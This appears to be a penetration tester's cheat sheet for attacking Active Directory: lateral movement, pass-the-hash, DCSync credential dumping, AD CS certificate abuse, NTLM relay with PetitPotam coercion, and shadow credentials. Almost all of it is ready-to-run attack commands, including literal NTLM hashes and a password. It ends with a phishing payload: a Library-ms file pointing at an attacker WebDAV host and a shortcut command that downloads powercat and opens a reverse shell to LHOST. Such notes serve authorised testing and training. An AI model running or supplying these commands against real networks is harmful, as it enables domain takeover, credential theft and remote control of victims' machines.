# Lateral Movement Replication and Delegation

Domain lateral movement, delegation abuse, remote execution options, DCSync workflows, and selected coercion/AD CS follow-on material.
Local Windows and Linux privilege-escalation content that had bled into the source file was removed or relocated.

## Active Directory Lateral and Vertical Movement Checklist

1. Find who is logged on to different hosts:

```bash
.\PsLoggedon.exe -accepteula \\COMPUTERNAME
```

2. Move laterally via RCE methods like PowerShell, WMIC, DCOM, or SC.
3. Move laterally with `psexec`.
4. Perform password spraying throughout the environment.
5. Use `Gomapexec` to attempt logins with valid credentials to different services.
6. Run Responder.
7. Run Snaffler to find sensitive files.
8. Pass the hash—reuse NTLM hashes:

```bash
nxc smb 192.168.123.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

9. Perform overpass-the-hash attacks.
10. Export Kerberos tickets to reuse from other systems (pass-the-ticket).
11. Attempt RCE over DCOM.
12. Mount all accessible shares and inspect them thoroughly.
13. Use Mythicsoft Agent Ransack to search for files.
14. Repeat enumeration steps—**Enumeration is key; try harder.**
15. Verify all findings and ensure no steps were missed.

## DCSync Attack

```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | sel
ect samaccountname,objectsid,memberof,useraccountcontrol |fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

## PS REMOTING?

```powershell
Enter-PSSession -ComputerName <host> -Credential <dom\\user>
```

## WMI EXEC?

```powershell
wmic /node:<host> process call create "cmd /c powershell -c <payload>"
```

## DCSync / Windows

As a Domain Admin
```
lsadump::dcsync /user:corp\dave
```

## DCSync / Linux

```rust
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.176.70
```

## ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2

```
certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username 'Administrator@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad ca -ca '<CA>' -add-officer '<USERNAME>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad ca -ca '<CA>' -enable-template SubCA -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template SubCA -upn 'Administrator@<DOMAIN>'
certipy-ad ca -ca '<CA>' -issue-request <ID> -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -retrieve <ID>
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad relay -target 'http://<CA>'
certipy-ad relay -ca '<CA>' -template '<TEMPLATE>'
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy-ad auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
```

## Coercing

```
impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'<RHOST>' 'dc.ccache'
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
```
```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -hashes '<HASH>' -template '<TEMPLATE>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```

or

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -password '<PASSWORD>' -template '<TEMPLATE>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```
```
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
```
```
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
```
```
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
```
```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v <EMAIL>
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```
```
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>@<DOMAIN>'
```

## Case 1

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```

## Case 2

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<RHOST>@<DOMAIN>'
certipy-ad req -ca 'CA' -username '<USERNAME>@<DOMAIN>' -password -hashes '<HASH>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx dc.pfx -dc-ip '<RHOST>' -ldap-shell
```

## ESC11: IF\_ENFORCEENCRYPTICERTREQUEST

```
certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>'
```
```
certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
```
```
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<CA>' -ca '<CA>' -template 'SecureAdminsAuthentication'
```
```
certipy-ad auth -pfx '<FILE>.pfx' -dc-ip '<RHOST>'
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-secretsdump -just-dc-user '<RHOST>$' '<DOMAIN>/<USERNAME>@<DOMAIN>' -dc-ip '<RHOST>' -target-ip '<RHOST>' -k -no-pass
```
```
python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
```
```
Set-ADUser -Identity <USERNAME> -Add @{'altSecurityIdentities'='X509:<RFC822>foobar@domain.local'}
```
```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v foobar@domain.local
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```
```
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
```
```
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>' -ldap-shell
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -application-policies 'Certificate Request Agent'
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -pfx '<FILE>.pfx' -on-behalf-of '<DOMAIN>\Administrator'
```
```
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>'
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```
```
certipy-ad shadow -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -account '<USERNAME>' auto
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
certipy-ad req -k -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User'
```

Revert the `UPN` to the original `user`.

```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```
```
certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500'
```

Revert the `UPN` to the original `user`.

```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```
```
certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

## ADMiner

```
AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```

## Certify

> [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

```
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

## Evil-WinRM

```
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

## impacket-atexec

```
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```

## impacket-changepasswd

```
impacket-changepasswd <DOMAIN>/<USERNAME>@<RHOST> -reset -altuser <USERNAME> -althash :<HASH>
```

## impacket-dcomexec

```
impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug <DOMAIN>/<USERNAME>:<PASSWORD> <COMMAND>
impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand <DOMAIN>/<USERNAME>@<RHOST> <COMMAND>
```

## impacket-findDelegation

```
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
```

## impacket-GetADUsers

```
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
```

## impacket-getST

```
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
```

## impacket-getTGT

```
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

## impacket-lookupsid

```
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

## impacket-netview

```
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
```

## impacket-psexec

```
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

## impacket-samrdump

```
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

## impacket-secretsdump

```
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```

## impacket-services

```
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
```

## owneredit.py

> [https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py](https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py)

```
python3 owneredit.py -k <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -action write -new-owner <USERNAME> -target <GROUP> -debug
```

## ThePorgs Fork

```
pipenv shell
git clone https://github.com/ThePorgs/impacket/
pip3 install -r requirements.txt
sudo python3 setup.py install
```

## PowerView Example

```
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```
```
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```

## PowerView Example

```
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.

```
schtasks /query /fo LIST /v
icacls C:\PATH\TO\BINARY\<BINARY>.exe
Get-LocalGroupMember administrators
```

## PassTheCert

> [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

> [https://github.com/AlmondOffSec/PassTheCert/tree/main/Python](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)

```
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

## Powermad

```
Import-Module ./Powermad.ps1
$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

## Shadow Credentials

```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
```
```
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```
```
pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
```

or

```
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
```
```
net rpc group addmem '<GROUP>' '<USERNAME>' -U '<DOMAIN>'/'<USERNAME>'%'<PASSWORD>' -S '<RHOST>'
```
```
bloodyAD --host <RHOST> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' get object <GROUP> --attr member
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
```
```
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```
```
pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
```

## winexe

```
winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

## config.Library-ms

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.

## Shortcut File

Right-click on Windows to create a new `shortcut file`.

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

Put the `shortcut file (*.lnk)` into the `webdav` folder.
